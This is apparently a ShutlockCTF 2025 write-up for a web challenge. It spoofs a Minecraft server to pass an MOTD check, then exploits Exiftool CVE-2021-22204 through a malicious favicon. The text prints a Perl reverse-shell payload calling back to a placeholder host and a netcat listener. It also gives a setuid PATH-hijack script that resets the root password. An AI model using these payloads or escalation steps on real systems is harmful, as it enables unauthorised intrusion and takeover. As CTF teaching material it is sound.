---
title: Old School Markus
author: Fozl
event: ShutlockCTF 2025
categories: [ShutlockCTF_2025, Web]
date: 2025-07-05
tags:
  - rce
  - exiftool
  - minecraft
  - privesc
  - path-hijacking
  - setuid
  - cve-2021-22204
info:
  description: Welcome to the Cannes Film Festival website. On this site you will find a film survey. You can also contact an administrator to generate a proof of attendance.
  difficulty: 4
img_path: /assets/img/Writeups/ShutlockCTF_2025/Web/Old_School_Markus/
image:
  path: /assets/img/Writeups/ShutlockCTF_2025/shutlock2025.png
---

## Challenge Description

{{ page.info.description }}

---

## Recon & Functionality

The website provides an interface to query Minecraft servers and retrieve their MOTD (Message Of The Day).

![]({{ page.img_path }}2969c80018c7428d9e239d9ff4663b23.png)

For reference, the Minecraft in-game server list displays the MOTD like this:

![]({{ page.img_path }}5402493036e140b092525070b4f65f42.png)

Testing with a public Minecraft server (`org.earthmc.net:25565`), the site sends a GET request with the following parameters:

```
server=org.earthmc.net
port=25565
````

![]({{ page.img_path }}22387211ad314123bcc20a0c0cf010f2.png)

However, nothing of interest appears in the result, since the keywords “CINEMA” and “CANNES” are absent from the MOTD.

---

## Source Review: Debug Parameter & First Approach

Reviewing the HTML, the form is:

```html
<form method="GET">
  <input type="text" name="server" placeholder="IP du serveur (ex: play.monserveur.com)" required="">
  <input type="number" name="port" placeholder="Port du serveur (ex: 25565)" required="">
  <!-- <input type="hidden" name="debug" value="debug_for_admin_20983rujf2j1i2" > -->
  <button type="submit">🎮 Obtenir les Infos</button>
</form>
````

A commented-out hidden field `debug=debug_for_admin_20983rujf2j1i2` is present. Manually adding this parameter in requests changes nothing (yet).

---

## Bypassing the MOTD Check

The challenge seems to require the MOTD to contain both "CINEMA" and "CANNES".
Self-hosted free Minecraft server services are available, allowing us to edit `server.properties` and set:

```
motd=CINEMA & CANNES :)
```

However, querying this server shows that the site expects over a million online players for validation—an impossible condition.

![]({{ page.img_path }}e306be6f0291431fb2dd743d2f9f8fc8.png)

---

## Emulating a Fake Minecraft Server

To bypass this restriction, a fake Minecraft server is needed. The Java Edition server list ping protocol is documented [here](https://minecraft.wiki/w/Java_Edition_protocol/Server_List_Ping).

Using Python, a minimalist server is created that responds with the exact MOTD and desired player counts:

```python
import socket
import struct
import json

def encode_varint(value):
    data = b""
    while True:
        temp = value & 0b01111111
        value >>= 7
        if value != 0:
            temp |= 0b10000000
        data += bytes([temp])
        if value == 0:
            break
    return data

def encode_string(string):
    encoded = string.encode("utf-8")
    return encode_varint(len(encoded)) + encoded

def build_status_response():
    json_data = {
        "version": {
            "name": "1.20.1",
            "protocol": 763
        },
        "players": {
            "max": 2000000,
            "online": 1000001,
            "sample": [
                {"name": "Steve", "id": "00000000-0000-0000-0000-000000000000"}
            ]
        },
        "description": {
            "text": "CINEMA & CANNES :)"
        },
        "favicon": ""
}
    json_str = json.dumps(json_data)
    json_bytes = encode_string(json_str)
    packet = encode_varint(0x00) + json_bytes
    return encode_varint(len(packet)) + packet

def build_pong_response(ping_payload):
    packet = encode_varint(0x01) + ping_payload
    return encode_varint(len(packet)) + packet

def start_fake_server(host="0.0.0.0", port=25565):
    print(f"Fake Minecraft server on {host}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)

    while True:
        conn, addr = s.accept()
        with conn:
            try:
                length = conn.recv(1)
                if not length:
                    continue
                packet_len = ord(length)
                data = conn.recv(packet_len)

                if data[-1] != 1:
                    continue

                length = conn.recv(1)
                packet_len = ord(length)
                data = conn.recv(packet_len)

                conn.sendall(build_status_response())

                # Ping
                length = conn.recv(1)
                if not length:
                    continue
                packet_len = ord(length)
                data = conn.recv(packet_len)

                # Pong
                pong = build_pong_response(data[1:])
                conn.sendall(pong)

            except Exception as e:
                print(f"Error: {e}")
            finally:
                conn.close()

if __name__ == "__main__":
    start_fake_server()
```

Launching the fake server, the site successfully fetches the MOTD as needed.

![]({{ page.img_path }}c57afc717bed453ca2a9d509f42be3b7.png)

---

## The Debug Parameter and Favicon Handling

Re-sending the request with the `debug` parameter results in a server error:

![]({{ page.img_path }}ba4189fda16141d790d1205b33f5633c.png)

It turns out the server expects a favicon image (base64-encoded). Adding a valid base64 favicon to the response makes the debug view work.

![]({{ page.img_path }}7dd0ee2205074d91a2dc3e7e450ce154.png)

A new HTML comment appears:

```
<!-- Exiftool Version: 12.23, Taille du fichier: 27260 -->
```

This is suspicious—why reveal the Exiftool version? A quick search reveals [CVE-2021-22204](https://nvd.nist.gov/vuln/detail/CVE-2021-22204), a critical RCE affecting this Exiftool version.

---

## Exiftool RCE Exploitation (CVE-2021-22204)

The vulnerability allows arbitrary code execution through a crafted image file. Public exploit scripts exist, it creates an exploit image embedding a reverse shell payload:

```
python3 exploit.py -s YOUR_IP 4444 -i sanic.jpg
        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....

RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(4444,inet_aton('YOUR_IP')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
RUNTIME: DONE - Exploit image written to 'image.jpg'
```

The crafted image is base64-encoded and returned as the Minecraft server's favicon.
With a listener ready (`nc -lvnp 4444`), the debug request triggers the exploit. Reverse shell received:

```
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on <IP> 37404
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(flaskuser) gid=1000(flaskuser) groups=1000(flaskuser)
```

---

## Shell Upgrade & Initial Enumeration

Upgrading the shell for usability:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Directory listing reveals:

```
flaskuser@app:/app$ alias ll="ls -lsah"
flaskuser@app:/app$ ll
total 52K
8.0K drwxr-xr-x 1 flaskuser flaskuser 4.0K Jun 28 15:25 .
4.0K drwxr-xr-x 1 root      root      4.0K Jun 28 15:25 ..
4.0K -rw-r--r-- 1 flaskuser flaskuser 2.4K May 29 10:39 app.py
 16K ---s--x--x 1 root      root       16K May 29 10:39 fix_permissions
4.0K ---------- 1 root      root        40 May 29 10:39 flag.txt
4.0K drwxr-xr-x 1 flaskuser flaskuser 4.0K Jun 28 16:08 images
4.0K -rw-r--r-- 1 flaskuser flaskuser   25 May 29 10:39 requirements.txt
4.0K -rw-r--r-- 1 flaskuser flaskuser    2 Jun 28 15:25 supervisord.pid
4.0K drwxr-xr-x 1 flaskuser flaskuser 4.0K May 29 10:39 templates
```

The flag file (`flag.txt`) is present but only readable by root.

---

## Privilege Escalation: setuid Binary and PATH Hijack

A setuid binary is present: `fix_permissions` (owned by root).
This means that the script will be executed with root rights.
Examining its behavior:

```
flaskuser@app:/app$ ./fix_permissions
[*] Fixing permissions for files in /app/images
[*] Running as UID: 0
[*] Command: chmod 400 *
```

Classic setuid pitfall: the binary likely calls `chmod` without an absolute path, meaning the executed binary depends on the current `PATH` variable.

To exploit this:

1. Write a custom `chmod` script to reset the root password:

   ```bash
   #!/bin/bash
   echo "root:1234" | chpasswd
   ```

2. Place the script as `chmod` in `/app` and make it executable.

3. Prepend `/app` to `PATH`:

   ```bash
   export PATH=/app:$PATH
   ```

4. Run the setuid binary:

   ```bash
   ./fix_permissions
   ```
   
The script calls `chmod` and finds the first match in `PATH` (`/app/chmod.sh`), i.e. our script rather than the real binary in `/usr/bin/chmod`.

No errors reported, now attempt to become root:

```
flaskuser@app:/app$ su
Password: 1234
```

Success:

```
root@app:/app# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Flag

Flag can now be read:

```
root@app:/app# cat flag.txt
SHLK{O!d_Sch0Ol_Guy_Ho1ds_Olds_V3rsions}
```

---

## TL;DR

* MOTD validator expects high player count and specific keywords; bypassed by emulating a custom Minecraft server.
* Site fetches favicon and processes it with vulnerable Exiftool (v12.23).
* CVE-2021-22204 exploited to gain initial shell via malicious image payload.
* Local privilege escalation via setuid binary and `PATH` hijack—custom `chmod` script resets root password.
* Root shell obtained and flag recovered.

---
